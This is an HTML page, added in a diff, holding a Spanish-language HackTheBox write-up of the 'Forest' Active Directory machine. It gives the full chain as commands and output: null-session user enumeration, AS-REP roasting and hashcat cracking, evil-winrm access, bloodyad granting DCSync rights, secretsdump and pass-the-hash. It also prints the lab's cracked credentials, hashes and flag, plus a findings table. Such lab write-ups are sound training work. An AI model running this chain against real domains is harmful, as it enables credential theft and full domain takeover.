@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Forest HTB &mdash; Exchange DCSync | OJM.SEC</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #f7f6f2; --surface: #ffffff; --border: #e2e0d8;
+  --text: #1a1917; --muted: #7a7870; --accent: #c8441b; --accent2: #1b5ec8;
+  --tag-bg: #f0ede4; --mono: 'JetBrains Mono', monospace; --sans: 'Syne', sans-serif;
+}
+html { scroll-behavior: smooth; }
+body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; }
+nav {
+  position: sticky; top: 0; z-index: 100; background: var(--bg);
+  border-bottom: 1px solid var(--border); padding: 0 2rem;
+  display: flex; align-items: center; justify-content: space-between; height: 56px;
+}
+.nav-logo { font-size: 1rem; font-weight: 800; letter-spacing: -0.02em; text-decoration: none; color: var(--text); }
+.nav-logo span { color: var(--accent); }
+.nav-links { display: flex; gap: 2rem; align-items: center; }
+.nav-links a { font-family: var(--mono); font-size: 0.75rem; color: var(--muted); text-decoration: none; letter-spacing: 0.05em; transition: color 0.2s; }
+.nav-links a:hover { color: var(--text); }
+.nav-writeup-nav { display: flex; gap: 0.5rem; }
+.nav-btn { font-family: var(--mono); font-size: 0.68rem; padding: 0.3rem 0.8rem; border: 1px solid var(--border); background: none; color: var(--muted); cursor: pointer; text-decoration: none; letter-spacing: 0.04em; transition: all 0.15s; display: flex; align-items: center; gap: 0.3rem; }
+.nav-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-btn.prev { background: var(--tag-bg); }
+.writeup-hero { max-width: 1100px; margin: 0 auto; padding: 4rem 2rem 3rem; border-bottom: 1px solid var(--border); }
+.hero-meta { display: flex; gap: 1rem; align-items: center; flex-wrap: wrap; margin-bottom: 1.5rem; }
+.platform-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; border: 1px solid var(--border); color: var(--muted); }
+.platform-badge.htb { border-color: #9fef00; color: #5a8a00; background: #f6fff0; }
+.difficulty-badge { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; padding: 0.25rem 0.7rem; background: var(--tag-bg); color: var(--muted); }
+.writeup-hero h1 { font-size: clamp(2rem, 4vw, 3.2rem); font-weight: 800; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 0.6rem; }
+.writeup-hero .subtitle { font-family: var(--mono); font-size: 0.82rem; color: var(--muted); margin-bottom: 1.5rem; }
+.hero-stats { display: flex; gap: 2rem; flex-wrap: wrap; padding-top: 1.5rem; border-top: 1px solid var(--border); }
+.stat { display: flex; flex-direction: column; gap: 0.2rem; }
+.stat-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); }
+.stat-value { font-family: var(--mono); font-size: 0.82rem; font-weight: 500; color: var(--text); }
+.writeup-layout { max-width: 1100px; margin: 0 auto; padding: 3rem 2rem 6rem; display: grid; grid-template-columns: 220px 1fr; gap: 3rem; }
+@media (max-width: 768px) { .writeup-layout { grid-template-columns: 1fr; } .sidebar { display: none; } }
+.sidebar { position: sticky; top: 76px; align-self: start; }
+.sidebar-title { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); margin-bottom: 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+.sidebar-nav { display: flex; flex-direction: column; gap: 0.1rem; }
+.sidebar-link { font-family: var(--mono); font-size: 0.68rem; color: var(--muted); text-decoration: none; padding: 0.35rem 0.7rem; border-left: 2px solid transparent; transition: all 0.15s; letter-spacing: 0.02em; }
+.sidebar-link:hover { color: var(--text); border-left-color: var(--accent); background: var(--tag-bg); }
+.sidebar-link.active { color: var(--accent); border-left-color: var(--accent); }
+.writeup-content { min-width: 0; }
+.section { margin-bottom: 3.5rem; padding-bottom: 3.5rem; border-bottom: 1px solid var(--border); }
+.section:last-child { border-bottom: none; }
+.section-label { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; text-transform: uppercase; color: var(--accent); margin-bottom: 0.5rem; }
+.section h2 { font-size: 1.6rem; font-weight: 800; letter-spacing: -0.02em; margin-bottom: 1.2rem; line-height: 1.2; }
+.section h3 { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin: 1.8rem 0 0.7rem; }
+.section p { font-family: var(--mono); font-size: 0.78rem; line-height: 1.9; color: #3d3b36; margin-bottom: 0.8rem; }
+.section ul { list-style: none; padding: 0; margin-bottom: 1rem; }
+.section ul li { font-family: var(--mono); font-size: 0.76rem; line-height: 1.8; color: #3d3b36; padding-left: 1.2rem; position: relative; margin-bottom: 0.2rem; }
+.section ul li::before { content: '→'; position: absolute; left: 0; color: var(--accent); font-size: 0.65rem; top: 0.05rem; }
+.attack-step { margin-bottom: 2.5rem; padding: 1.5rem 1.8rem; border: 1px solid var(--border); background: var(--surface); position: relative; }
+.attack-step::before { content: ''; position: absolute; top: 0; left: 0; width: 3px; height: 100%; background: var(--accent); }
+.step-num { font-family: var(--mono); font-size: 0.6rem; letter-spacing: 0.12em; color: var(--accent); text-transform: uppercase; margin-bottom: 0.4rem; }
+.step-title { font-size: 1.05rem; font-weight: 700; letter-spacing: -0.01em; margin-bottom: 1rem; line-height: 1.3; }
+.step-desc { font-family: var(--mono); font-size: 0.76rem; color: #3d3b36; line-height: 1.9; margin-bottom: 0.9rem; }
+.step-h3 { font-family: var(--sans); font-size: 0.88rem; font-weight: 700; margin: 1.4rem 0 0.6rem; color: var(--text); }
+pre { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; overflow-x: auto; line-height: 1.8; border-left: 3px solid var(--accent); }
+code { font-family: var(--mono); font-size: 0.78em; background: var(--tag-bg); padding: 0.1em 0.35em; border-radius: 2px; }
+.cmd-comment { color: #6b7280; }
+.cmd-flag { color: #60a5fa; }
+.cmd-value { color: #34d399; }
+.cmd-tool { color: #f87171; }
+.callout { background: var(--tag-bg); border-left: 3px solid var(--accent2); padding: 1rem 1.2rem; margin: 1rem 0; font-family: var(--mono); font-size: 0.74rem; line-height: 1.8; color: #3d3b36; }
+.callout strong { color: var(--accent2); }
+.callout-warn { border-left-color: var(--accent); }
+.callout-warn strong { color: var(--accent); }
+.findings-table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-family: var(--mono); font-size: 0.72rem; }
+.findings-table th { text-align: left; padding: 0.6rem 0.8rem; background: var(--tag-bg); font-size: 0.6rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); border-bottom: 2px solid var(--border); }
+.findings-table td { padding: 0.7rem 0.8rem; border-bottom: 1px solid var(--border); color: #3d3b36; vertical-align: top; }
+.findings-table tr:hover td { background: var(--tag-bg); }
+.severity { display: inline-block; font-size: 0.6rem; letter-spacing: 0.08em; padding: 0.15rem 0.5rem; font-weight: 600; }
+.sev-critical { background: #fee2e2; color: #7f1d1d; }
+.sev-high { background: #fee2e2; color: #991b1b; }
+.sev-medium { background: #fef3c7; color: #92400e; }
+.sev-info { background: #e0f2fe; color: #0c4a6e; }
+.tag-row { display: flex; gap: 0.4rem; flex-wrap: wrap; margin-top: 1rem; }
+.tag { font-family: var(--mono); font-size: 0.6rem; padding: 0.18rem 0.5rem; border: 1px solid var(--border); color: var(--muted); letter-spacing: 0.04em; }
+.creds-box { background: #1a1917; color: #e8e4d9; font-family: var(--mono); font-size: 0.72rem; padding: 1.2rem 1.4rem; margin: 0.8rem 0; border-left: 3px solid #34d399; line-height: 2; }
+.cred-label { color: #6b7280; }
+.cred-user { color: #60a5fa; }
+.cred-pass { color: #34d399; }
+.writeup-nav-bottom { display: flex; justify-content: space-between; align-items: center; padding-top: 2rem; margin-top: 2rem; border-top: 1px solid var(--border); }
+.nav-link-btn { font-family: var(--mono); font-size: 0.72rem; color: var(--muted); text-decoration: none; padding: 0.6rem 1rem; border: 1px solid var(--border); display: flex; align-items: center; gap: 0.5rem; transition: all 0.15s; }
+.nav-link-btn:hover { border-color: var(--text); color: var(--text); }
+.nav-link-btn.prev-page { background: var(--tag-bg); }
+footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; font-family: var(--mono); font-size: 0.68rem; color: var(--muted); letter-spacing: 0.06em; }
+</style>
+</head><body>
+<nav>
+  <a class="nav-logo" href="index.html">OJM<span>.</span>SEC</a>
+  <div class="nav-links">
+    <a href="index.html">&larr; Volver</a>
+    <div class="nav-writeup-nav">
+      <a class="nav-btn prev" href="checkpoint.html">&larr; Checkpoint</a>
+      <a class="nav-btn" href="index.html#writeups">Todos</a>
+    </div>
+  </div>
+</nav>
+<div class="writeup-hero">
+  <div class="hero-meta">
+    <span class="platform-badge htb">HackTheBox</span>
+    <span class="difficulty-badge">Active Directory</span>
+    <span class="difficulty-badge">Windows Server 2016</span>
+    <span class="difficulty-badge">22 Jun 2026</span>
+  </div>
+  <h1>Forest</h1>
+  <p class="subtitle">htb.local &mdash; Domain Admin via AS-REP Roasting + Exchange Trusted Subsystem DCSync</p>
+  <div class="hero-stats">
+    <div class="stat"><span class="stat-label">Target IP</span><span class="stat-value">10.129.19.183</span></div>
+    <div class="stat"><span class="stat-label">Domain</span><span class="stat-value">htb.local (FOREST)</span></div>
+    <div class="stat"><span class="stat-label">OS</span><span class="stat-value">Windows Server 2016 Std 14393</span></div>
+    <div class="stat"><span class="stat-label">Findings</span><span class="stat-value">4 (1 Critical, 2 High, 1 Info)</span></div>
+    <div class="stat"><span class="stat-label">Resultado</span><span class="stat-value">Domain Admin (DCSync)</span></div>
+    <div class="stat"><span class="stat-label">Autor</span><span class="stat-value">Oriol Jaen Mirabet</span></div>
+  </div>
+</div>
+<div class="writeup-layout">
+  <aside class="sidebar">
+    <div class="sidebar-title">Contenido</div>
+    <nav class="sidebar-nav">
+      <a class="sidebar-link" href="#resumen">Resumen ejecutivo</a>
+      <a class="sidebar-link" href="#nmap">01 &middot; Nmap</a>
+      <a class="sidebar-link" href="#users">02 &middot; User Enum</a>
+      <a class="sidebar-link" href="#asrep">03 &middot; AS-REP Roasting</a>
+      <a class="sidebar-link" href="#winrm">04 &middot; WinRM svc-alfresco</a>
+      <a class="sidebar-link" href="#exchange">05 &middot; Exchange Abuse</a>
+      <a class="sidebar-link" href="#dcsync">06 &middot; DCSync</a>
+      <a class="sidebar-link" href="#findings">Findings</a>
+      <a class="sidebar-link" href="#creds">Credenciales</a>
+    </nav>
+  </aside>
+  <main class="writeup-content">
+    <section class="section" id="resumen">
+      <div class="section-label">00 &mdash; Overview</div>
+      <h2>Resumen Ejecutivo</h2>
+      <p>Forest es un Domain Controller con Exchange instalado que ilustra un attack path cl&aacute;sico pero todav&iacute;a frecuente en redes Windows corporativas: <strong>AS-REP Roasting</strong> para obtener un primer acceso como service account, seguido de abuso de permisos de <strong>Exchange Trusted Subsystem</strong> para otorgarse derechos de DCSync sobre el dominio.</p>
+      <p>La enumeraci&oacute;n de usuarios v&iacute;a SMB nulo funciona sin credenciales, exponiendo toda la lista de cuentas. svc-alfresco tiene desactivada la pre-autenticaci&oacute;n Kerberos, entregando su hash AS-REP. Una vez dentro, el grupo Account Operators permite manipular grupos de Exchange, que a su vez dan WriteDACL sobre el dominio &mdash; suficiente para hacer DCSync y obtener todos los hashes del NTDS.dit.</p>
+      <div class="callout"><strong>Attack Path</strong><br>SMB null &rarr; user enum RID brute &rarr; AS-REP Roasting svc-alfresco &rarr; hashcat -m 18200 &rarr; s3rvice &rarr; WinRM &rarr; bloodyad add Exchange groups &rarr; add DCSync rights &rarr; impacket-secretsdump &rarr; Administrator hash &rarr; Pass-the-Hash</div>
+    </section>
+    <section class="section" id="nmap">
+      <div class="section-label">01 &mdash; Recon</div>
+      <h2>Nmap &mdash; DC con Exchange (EXCH01) en htb.local</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 01</div>
+        <div class="step-title">Windows Server 2016 &mdash; 53, 88, 389, 445, 5985 abiertos</div>
+        <p class="step-desc">El DC es cl&aacute;sico: DNS, Kerberos, LDAP, SMB, WinRM. El nombre del host es FOREST y el dominio htb.local. La presencia de Exchange se deduce del LDAP dump posterior (cuentas HealthMailbox*, grupo Exchange Trusted Subsystem).</p>
+        <pre>53/tcp   open  domain   Simple DNS Plus
+88/tcp   open  kerberos-sec
+389/tcp  open  ldap     htb.local
+445/tcp  open  microsoft-ds
+5985/tcp open  http     WinRM (Microsoft HTTPAPI 2.0)
+<span class="cmd-comment"># Service Info: Host: FOREST | OS: Windows Server 2016 Std 14393</span></pre>
+      </div>
+    </section>
+    <section class="section" id="users">
+      <div class="section-label">02 &mdash; Enum</div>
+      <h2>User Enum v&iacute;a SMB null &mdash; svc-alfresco visible</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 02</div>
+        <div class="step-title">Sesi&oacute;n nula &rarr; lista completa de usuarios del dominio</div>
+        <p class="step-desc">La autenticaci&oacute;n nula est&aacute; habilitada. nxc con usuario vac&iacute;o devuelve la lista completa de usuarios del dominio incluyendo cuentas de servicio. Entre los usuarios no-HealthMailbox aparecen: sebastien, lucinda, <strong>svc-alfresco</strong>, andy, mark, santi.</p>
+        <pre><span class="cmd-tool">nxc</span> smb 10.129.19.183 <span class="cmd-flag">-u</span> '' <span class="cmd-flag">-p</span> '' --users | awk '{print $5}' > users.txt
+<span class="cmd-value">svc-alfresco / sebastien / lucinda / andy / mark / santi</span>
+<span class="cmd-comment"># + HealthMailbox*, SM_*, $331000-VK4ADACQNUCA (Exchange accounts)</span></pre>
+      </div>
+    </section>
+    <section class="section" id="asrep">
+      <div class="section-label">03 &mdash; AS-REP Roasting</div>
+      <h2>svc-alfresco sin pre-auth Kerberos &rarr; hash AS-REP crackeable</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 03</div>
+        <div class="step-title">GetNPUsers &rarr; $krb5asrep$23$ svc-alfresco &rarr; hashcat -m 18200 &rarr; s3rvice</div>
+        <p class="step-desc">AS-REP Roasting funciona cuando una cuenta tiene desactivado el flag <code>UF_DONT_REQUIRE_PREAUTH</code>: el KDC devuelve un AS-REP cifrado con la clave del usuario sin necesidad de demostrar identidad. El hash etype 23 (RC4) se crackea offline con hashcat en segundos con rockyou.</p>
+        <pre><span class="cmd-tool">impacket-GetNPUsers</span> htb.local/guest <span class="cmd-flag">-dc-ip</span> 10.129.19.183 <span class="cmd-flag">-usersfile</span> users.txt <span class="cmd-flag">-request -no-pass</span>
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:ea8fcd60...<span class="cmd-comment">[hash AS-REP]</span>
+
+<span class="cmd-tool">hashcat</span> <span class="cmd-flag">-m</span> 18200 svc-alfresco-hash.txt /usr/share/wordlists/rockyou.txt
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:...: <span class="cmd-value">s3rvice</span></pre>
+      </div>
+    </section>
+    <section class="section" id="winrm">
+      <div class="section-label">04 &mdash; Initial Shell</div>
+      <h2>WinRM como svc-alfresco &mdash; Account Operators</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 04</div>
+        <div class="step-title">evil-winrm &rarr; shell &rarr; svc-alfresco es Account Operator</div>
+        <p class="step-desc">svc-alfresco tiene acceso WinRM y es miembro de <code>Account Operators</code> y <code>Privileged IT Accounts</code>. Account Operators puede a&ntilde;adir usuarios a la mayor&iacute;a de grupos del dominio incluyendo grupos de Exchange, lo que es el vector de escalada.</p>
+        <pre><span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> 10.129.19.183 <span class="cmd-flag">-u</span> svc-alfresco <span class="cmd-flag">-p</span> s3rvice
+
+*Evil-WinRM* PS> whoami /groups | findstr "Account Operators"
+<span class="cmd-value">BUILTIN\Account Operators  Enabled</span>
+
+type C:\Users\svc-alfresco\Desktop\user.txt
+<span class="cmd-value">9d43be6e04be92f5c34c2dc86d3437f6</span></pre>
+      </div>
+    </section>
+    <section class="section" id="exchange">
+      <div class="section-label">05 &mdash; Privilege Escalation</div>
+      <h2>Exchange Trusted Subsystem &mdash; WriteDACL sobre el dominio</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 05</div>
+        <div class="step-title">svc-alfresco &rarr; Exchange groups &rarr; WriteDACL en htb.local &rarr; DCSync rights</div>
+        <p class="step-desc">El grupo <code>Exchange Windows Permissions</code> tiene WriteDACL sobre el objeto ra&iacute;z del dominio. Account Operators puede a&ntilde;adir miembros a este grupo. Con WriteDACL a&ntilde;adimos derechos de DCSync (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All) a svc-alfresco.</p>
+        <pre><span class="cmd-tool">bloodyad</span> --host 10.129.19.183 <span class="cmd-flag">-d</span> htb.local <span class="cmd-flag">-u</span> svc-alfresco <span class="cmd-flag">-p</span> s3rvice add groupMember "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco
+<span class="cmd-value">[+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS</span>
+
+<span class="cmd-tool">bloodyad</span> --host 10.129.19.183 <span class="cmd-flag">-d</span> htb.local <span class="cmd-flag">-u</span> svc-alfresco <span class="cmd-flag">-p</span> s3rvice add dcsync svc-alfresco
+<span class="cmd-value">[+] svc-alfresco is now able to DCSync</span></pre>
+      </div>
+    </section>
+    <section class="section" id="dcsync">
+      <div class="section-label">06 &mdash; DCSync</div>
+      <h2>impacket-secretsdump &rarr; NTDS.dit completo</h2>
+      <div class="attack-step">
+        <div class="step-num">Fase 06</div>
+        <div class="step-title">secretsdump via DRSUAPI &rarr; todos los hashes del dominio &rarr; Administrator PtH</div>
+        <p class="step-desc">Con derechos DCSync, impacket-secretsdump usa el protocolo DRSUAPI para sincronizar todas las credenciales del NTDS.dit directamente del DC sin necesidad de acceso f&iacute;sico ni volcar el archivo. Obtenemos el hash NTLM del Administrator del dominio y hacemos Pass-the-Hash para acceso completo.</p>
+        <pre><span class="cmd-tool">impacket-secretsdump</span> htb.local/svc-alfresco:s3rvice@10.129.19.183
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="cmd-value">32693b11e6aa90eb43d32c72a07ceea6</span>:::
+htb.local\svc-alfresco:1147:...<span class="cmd-value">:9248997e4ef68ca2bb47ae4e6f128668</span>:::
+<span class="cmd-comment"># + todos los hashes de HealthMailbox, SM_, krbtgt, domain users</span>
+
+<span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> 10.129.19.183 <span class="cmd-flag">-u</span> Administrator <span class="cmd-flag">-H</span> 32693b11e6aa90eb43d32c72a07ceea6
+<span class="cmd-value">*Evil-WinRM* PS C:\Users\Administrator\Documents></span></pre>
+      </div>
+    </section>
+    <section class="section" id="findings">
+      <div class="section-label">07 &mdash; Findings</div>
+      <h2>Tabla de Hallazgos</h2>
+      <table class="findings-table">
+        <thead><tr><th>Severity</th><th>Finding</th><th>Descripci&oacute;n</th><th>CVSS</th></tr></thead>
+        <tbody>
+          <tr><td><span class="severity sev-critical">Critical</span></td><td>Exchange WriteDACL &rarr; DCSync</td><td>Exchange Windows Permissions tiene WriteDACL sobre el dominio, permitiendo otorgarse derechos de replicaci&oacute;n y volcar todas las credenciales.</td><td>9.0</td></tr>
+          <tr><td><span class="severity sev-high">High</span></td><td>AS-REP Roasting &mdash; svc-alfresco</td><td>Pre-autenticaci&oacute;n Kerberos desactivada en cuenta de servicio expone hash crackeable offline.</td><td>7.5</td></tr>
+          <tr><td><span class="severity sev-high">High</span></td><td>Contrase&ntilde;a d&eacute;bil svc-alfresco</td><td>s3rvice crackeada con rockyou.txt en segundos.</td><td>7.3</td></tr>
+          <tr><td><span class="severity sev-info">Info</span></td><td>SMB null session activo</td><td>Lista completa de usuarios del dominio accesible sin credenciales.</td><td>3.1</td></tr>
+        </tbody>
+      </table>
+      <div class="tag-row"><span class="tag">AS-REP Roasting</span><span class="tag">Exchange Abuse</span><span class="tag">DCSync</span><span class="tag">WriteDACL</span><span class="tag">bloodyad</span><span class="tag">NTDS.dit</span><span class="tag">impacket-secretsdump</span></div>
+    </section>
+    <section class="section" id="creds">
+      <div class="section-label">08 &mdash; Credentials</div>
+      <h2>Credenciales Obtenidas</h2>
+      <div class="creds-box"><span class="cred-label"># AS-REP Roasting (hashcat -m 18200)</span>
+<span class="cred-user">svc-alfresco</span>:<span class="cred-pass">s3rvice</span>
+<span class="cred-label"># Administrator NTLM (DCSync via secretsdump)</span>
+<span class="cred-user">htb.local\Administrator</span>:<span class="cred-pass">32693b11e6aa90eb43d32c72a07ceea6 [NTLM]</span></div>
+      <div class="callout"><strong>Flags</strong><br>user.txt: 9d43be6e04be92f5c34c2dc86d3437f6<br>root.txt: [accessible post DCSync via Administrator PtH]</div>
+    </section>
+  </main>
+</div>
+<footer>OJM.SEC &middot; Oriol Jaen Mirabet &middot; Security Research &amp; Writeups</footer>
+</body>
+</html>
